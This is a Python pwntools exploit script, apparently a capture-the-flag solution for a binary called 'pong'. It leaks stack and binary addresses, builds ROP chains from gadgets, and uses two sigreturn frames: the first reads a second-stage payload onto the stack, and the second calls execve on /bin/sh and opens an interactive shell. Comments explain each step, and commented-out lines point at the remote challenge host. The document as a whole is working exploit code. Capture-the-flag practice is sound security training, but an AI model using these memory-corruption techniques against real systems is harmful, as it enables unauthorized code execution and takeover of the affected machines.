from pwn import *
import warnings

warnings.simplefilter("ignore", category = BytesWarning)
context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("./pong")

# using the a fake environment to make the stack
# layout of the local binary more similar to remote
# (stack layouts can be compared by printing the hexdump
# of the stack leak which is happening below)
custom_env = {}
for i in range(10):
	custom_env[chr(0x41 + i)] = "1"

# p = remote("flu.xxx", 10060)
# p = remote("127.0.0.1", 12345)
p = elf.process(env=custom_env)

# gdb.attach(p)
# pause()

p.sendline(b"AAAA")
leak = p.recv(0x200)

print(hexdump(leak))

binary = u64(leak[0xc8:0xd0]) - 0x40	# local & docker
# binary = u64(leak[0xb8:0xc0]) - 0x40	# remote in ctf
stack_leak = u64(leak[0x8:0x10]) - 0x2000	# a location on the stack							# XXX - 0xf7 - 0x1d89
# Note that we can't reliably find the starting location of our input buffer on the stack
# because the stack seems to be very unreliable and the offset from stack leaks to our buffer keeps
# changing. Instead, we will pick any place on the stack (stack_leak) and use SROP to read
# a second ROP payload there and also set rsp to there.

log.info("binary base = " + hex(binary))
log.info("stack leak = " + hex(stack_leak))

# gadgets:
# 0x000000000000103c : inc eax ; cmp r8, 4 ; jl 0x1010 ; ret
# 0x0000000000001036 : syscall ; xor rax, rax ; if (++r8 >= 4) ret
# 0x0000000000001044 : ret

# Just so that we reach the last iteration of read/write
# when we will be 'ret'ing afterwards.
p.sendline(b"")
p.recv(0x200)
p.sendline(b"")
p.recv(0x200)

# The function epilogue doesn't "add rsp, 0x200" although the
# prologue has "sub rsp, 0x200". So it will end up returning
# into our input buffer. So our input can be any ROP payload.
# As we don't have enough gadgets, we will use SROP here.
# We don't have the exact address of the input buffer on the
# stack so we will first read() another ROP chain to a predictable
# location and set rsp to the beginning of it. Then we can use that
# to call execve (we need to know the exact address of our ROP chain
# on the stack to load address of "/bin/sh" string into rdi)
rop1 = b""
for i in range(15):
	rop1 += p64(binary + 0x103c)	# inc rax
rop1 += p64(binary + 0x1036)		# syscall

frame = SigreturnFrame(arch = "amd64")
frame.rax = 0	# SYS_read
frame.rdi = 0
frame.rsi = stack_leak
frame.rdx = 0x1000
frame.r8 = 4
frame.rsp = stack_leak
frame.rip = binary + 0x1036	# syscall

rop1 += bytes(frame)

p.send(rop1)
p.recv(0x200)

rop2 = b""
for i in range(15):
	rop2 += p64(binary + 0x103c)	# inc rax
rop2 += p64(binary + 0x1036)		# syscall

frame = SigreturnFrame(arch = "amd64")
frame.rax = 59	# SYS_execve
frame.rdi = stack_leak + 376
frame.rdx = frame.rsi = stack_leak + 376 + 8
frame.rip = binary + 0x1036	# syscall
frame.r8 = 4
frame.rsp = stack_leak + 376

rop2 += bytes(frame)

assert len(rop2) == 376

rop2 += b"/bin/sh\0"
rop2 += p64(stack_leak + 376)
rop2 += p64(0)

p.send(rop2)
p.interactive()
